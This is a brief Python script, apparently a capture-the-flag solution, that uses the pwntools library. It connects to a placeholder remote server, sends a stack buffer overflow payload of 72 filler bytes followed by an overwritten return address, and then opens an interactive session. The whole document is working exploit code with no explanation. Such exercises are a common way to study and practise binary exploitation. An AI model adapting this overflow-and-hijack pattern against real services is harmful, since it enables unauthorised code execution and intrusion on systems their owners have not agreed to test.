import pwn

r = pwn.remote('<server>',<port>);
payload = "a"*72 + '\x50\x11@\x00\x00\x00\x00\x00'

r.sendline(payload)
r.interactive()
